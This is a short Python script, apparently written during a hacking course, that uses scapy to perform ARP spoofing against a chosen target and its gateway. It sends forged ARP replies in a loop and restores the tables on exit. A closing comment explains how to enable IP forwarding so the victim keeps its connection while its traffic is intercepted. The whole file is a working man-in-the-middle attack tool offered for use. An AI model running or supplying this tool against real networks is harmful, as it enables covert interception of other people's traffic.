#!/usr/bin/env python

import scapy.all as scapy
import time
import argparse
# import sys   this is for python 2.7

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t" , "--target_ip",dest = "target_ip", help="Target IP for ARP Spoofing ")
    parser.add_argument("-g", "--gateway_ip", dest="gateway_ip", help="Gateway IP for ARP Spoofing ")
    options = parser.parse_args()
    return options

def get_mac(ip): #For KNOWING MAC ADDRESS OF TARGET MACHINE USING TARGET MACHINE IP
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout = 1,verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip,spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    #packet = scapy.ARP(op = "" , pdst = "TARGET IP" , hwdst="TARGET MAC" , psrc="SOURCE/ROUTER MAC") CHECK THINGS USIMG scapy.ls(scapy.ARP())
    scapy.send(packet, verbose=False)

def restore(destination_ip,source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

options = get_arguments()
target_ip = str(options.target_ip)
gateway_ip = str(options.gateway_ip)

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)    #spoof(Routerip,your_machineip)
        spoof(gateway_ip, target_ip)    #spoof(Target_machineip,your_machineip)
        sent_packets_count = sent_packets_count + 2
        # print("\r[+] Packets sent : " + str(sent_packets_count)),  Python 2.7 Supported
        print("\r[+] Packets sent : " + str(sent_packets_count),end="")

        # sys.stdout.flush() Python 2.7 supported
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C .............Resetting ARP tables.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("\n[+] Resetting ARP tables Completed ...............Quiting.\n")





###DUE TO THIS PROGRAM ON RUNNING TARGET COMPUTER LOST HIS INTERNET CONNECTION SO FOR MAINTAINING THE INTERNET CONNECTION USE THE COMMAND IN TRERMINAL -: echo 1 >/proc/sys/net/ipv4/ip_forward
